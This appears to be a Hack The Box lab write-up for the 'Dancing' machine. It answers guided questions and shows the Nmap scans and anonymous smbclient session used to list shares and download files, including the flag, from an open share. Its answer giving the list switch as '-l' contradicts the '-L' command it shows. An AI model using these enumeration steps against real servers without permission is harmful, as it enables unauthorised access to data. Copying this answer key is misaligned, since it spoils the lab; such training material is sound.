# HTB - Dancing

#very-easy #windows

[TOC]

#### What does the 3-letter acronym SMB stand for?

Server Message Block

#### What port does SMB use to operate at?

445

#### What is the service name for port 445 that came up in our Nmap scan?

microsoft-ds

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap $IP -Pn -n --open --min-rate 3000 -p- 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 16:57 UTC
Nmap scan report for 10.129.1.12
Host is up (0.045s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.14 seconds
```

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap $IP -sC -sV -p 445                   
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 16:59 UTC
Nmap scan report for 10.129.1.12
Host is up (0.045s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 4h00m01s
| smb2-time: 
|   date: 2026-03-07T20:59:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.34 seconds
```

#### What is the 'flag' or 'switch' that we can use with smbclient utility to 'list' the available shares on Dancing?

`-l`

#### How many shares are there on Dancing?

4

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient -N -L //$IP

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.1.12 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

#### What is the name of the share we are able to access in the end with a blank password?

WorkShares

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient -N //$IP/WorkShares
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Mar 29 08:22:01 2021
  ..                                  D        0  Mon Mar 29 08:22:01 2021
  Amy.J                               D        0  Mon Mar 29 09:08:24 2021
  James.P                             D        0  Thu Jun  3 08:38:03 2021

                5114111 blocks of size 4096. 1733541 blocks available
```

#### What is the command we can use within the SMB shell to download the files we find?

`get`

#### Submit root flag

```bash
smb: \> recurse ON
smb: \> ls
  .                                   D        0  Mon Mar 29 08:22:01 2021
  ..                                  D        0  Mon Mar 29 08:22:01 2021
  Amy.J                               D        0  Mon Mar 29 09:08:24 2021
  James.P                             D        0  Thu Jun  3 08:38:03 2021

\Amy.J
  .                                   D        0  Mon Mar 29 09:08:24 2021
  ..                                  D        0  Mon Mar 29 09:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 11:00:37 2021

\James.P
  .                                   D        0  Thu Jun  3 08:38:03 2021
  ..                                  D        0  Thu Jun  3 08:38:03 2021
  flag.txt                            A       32  Mon Mar 29 09:26:57 2021

                5114111 blocks of size 4096. 1733532 blocks available
```

```bash
smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \Amy.J\> cd ../James.P
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ cat worknotes.txt 
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing
```

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ cat flag.txt     
5f61c...
```

